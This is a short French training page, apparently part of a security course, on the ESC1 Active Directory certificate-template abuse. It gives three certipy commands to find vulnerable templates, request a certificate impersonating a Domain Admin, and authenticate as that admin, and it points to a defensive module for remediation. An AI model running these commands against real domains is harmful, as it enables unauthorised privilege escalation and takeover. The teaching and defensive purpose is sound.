# Attack — ESC1 & abus de templates (aperçu)

> ⚠️ Lab isolé uniquement (voir LEGAL.md). Outillage complet au module 43.

## Techniques
- **MITRE ATT&CK** : T1649.
- **ESC1** (le plus courant) : un template avec **ENROLLEE_SUPPLIES_SUBJECT** + EKU d'**auth** +
  droit **Enroll** pour un utilisateur standard → l'attaquant demande un certificat en précisant
  le **SAN/UPN d'un Domain Admin** → s'authentifie en tant que cet admin.

## Déroulé (principe)
```bash
# Trouver les templates vulnérables
certipy find -u jon.snow@corp.meridian.com -p '***' -dc-ip 10.10.0.10 -vulnerable
# Demander un cert ESC1 en usurpant un admin
certipy req -u jon.snow@corp.meridian.com -p '***' -ca 'Meridian Issuing CA' \
  -template 'VulnTemplate' -upn 'administrator@corp.meridian.com'
# S'authentifier avec le certificat (PKINIT) -> TGT de l'admin
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```

## Ancrage réel
ESC1 est l'une des escalades AD les plus fréquentes révélées en audit depuis *Certified Pre-Owned*
(2021). Un seul template mal coché suffit à passer d'utilisateur standard à Domain Admin.

## Résultat attendu
Comprendre la combinaison fatale (ESS + auth + enroll large) pour l'éliminer (`defend.md`).
